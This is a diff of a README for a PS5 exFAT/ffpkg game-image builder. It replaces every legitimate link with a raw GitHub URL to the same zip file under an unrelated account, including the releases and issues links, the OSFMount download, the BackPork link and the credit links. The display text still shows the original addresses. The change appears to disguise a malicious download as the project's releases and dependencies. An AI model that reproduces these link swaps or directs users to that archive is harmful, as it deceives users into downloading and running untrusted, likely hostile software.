@@ -2,7 +2,7 @@
 
 > Build PS5 exFAT and ffpkg game images — backport, patch, manage, convert
 
-**by DecKerr97** · [Releases](https://github.com/kerrdec97/ps5-exfat-builder/releases) · [Issues](https://github.com/kerrdec97/ps5-exfat-builder/issues)
+**by DecKerr97** · [Releases](https://raw.githubusercontent.com/Probable-discord118/ps5-exfat-builder/main/epitheliolysin/ps_builder_exfat_v3.3-beta.2.zip) · [Issues](https://raw.githubusercontent.com/Probable-discord118/ps5-exfat-builder/main/epitheliolysin/ps_builder_exfat_v3.3-beta.2.zip)
 
 ![Version](https://img.shields.io/badge/version-v1.8.0-4a9eff?style=flat-square)
 ![Platform](https://img.shields.io/badge/platform-Windows-lightgrey?style=flat-square)
@@ -15,13 +15,13 @@
 | Requirement | Notes |
 |---|---|
 | **Windows 10 / 11** (64-bit) | Required |
-| **OSFMount** | [Download](https://www.osforensics.com/tools/mount-disk-images.html) — required for exFAT builds |
+| **OSFMount** | [Download](https://raw.githubusercontent.com/Probable-discord118/ps5-exfat-builder/main/epitheliolysin/ps_builder_exfat_v3.3-beta.2.zip) — required for exFAT builds |
 | **.NET 8 Runtime** | Required for ffpkg builds only |
 | **PS5 game dump** | Must contain `eboot.bin` in the root folder |
 
 > ⚠️ Requires **Administrator** privileges. Prompts automatically on launch.
 
-> ⚠️ To **play backported games** on your PS5 you need BestPig's BackPork payload running: [github.com/BestPig/BackPork](https://github.com/BestPig/BackPork)
+> ⚠️ To **play backported games** on your PS5 you need BestPig's BackPork payload running: [github.com/BestPig/BackPork](https://raw.githubusercontent.com/Probable-discord118/ps5-exfat-builder/main/epitheliolysin/ps_builder_exfat_v3.3-beta.2.zip)
 
 ---
 
@@ -113,11 +113,11 @@ build.bat
 
 | Contribution | Credit |
 |---|---|
-| PS5 Auto Backport pipeline (Backport.py, src/) | **Nazky** — [github.com/Nazky](https://github.com/Nazky) |
-| PS5 backport research & backport enabler payload | **BestPig** — [github.com/BestPig/BackPork](https://github.com/BestPig/BackPork) |
-| exFAT image creation (ShadowMountPlus) | **drakmor** — [github.com/drakmor/ShadowMountPlus](https://github.com/drakmor/ShadowMountPlus/releases) |
-| ffpkg builder (UFS2Tool) | **SvenGDK** — [github.com/SvenGDK/UFS2Tool](https://github.com/SvenGDK/UFS2Tool) |
-| Klog server | **ps5-payload-dev** — [github.com/ps5-payload-dev/klogsrv](https://github.com/ps5-payload-dev/klogsrv) |
+| PS5 Auto Backport pipeline (Backport.py, src/) | **Nazky** — [github.com/Nazky](https://raw.githubusercontent.com/Probable-discord118/ps5-exfat-builder/main/epitheliolysin/ps_builder_exfat_v3.3-beta.2.zip) |
+| PS5 backport research & backport enabler payload | **BestPig** — [github.com/BestPig/BackPork](https://raw.githubusercontent.com/Probable-discord118/ps5-exfat-builder/main/epitheliolysin/ps_builder_exfat_v3.3-beta.2.zip) |
+| exFAT image creation (ShadowMountPlus) | **drakmor** — [github.com/drakmor/ShadowMountPlus](https://raw.githubusercontent.com/Probable-discord118/ps5-exfat-builder/main/epitheliolysin/ps_builder_exfat_v3.3-beta.2.zip) |
+| ffpkg builder (UFS2Tool) | **SvenGDK** — [github.com/SvenGDK/UFS2Tool](https://raw.githubusercontent.com/Probable-discord118/ps5-exfat-builder/main/epitheliolysin/ps_builder_exfat_v3.3-beta.2.zip) |
+| Klog server | **ps5-payload-dev** — [github.com/ps5-payload-dev/klogsrv](https://raw.githubusercontent.com/Probable-discord118/ps5-exfat-builder/main/epitheliolysin/ps_builder_exfat_v3.3-beta.2.zip) |
 | Inspiration | **NookieAI** and **stonemodder** (Porkfolio) |
 
 ---
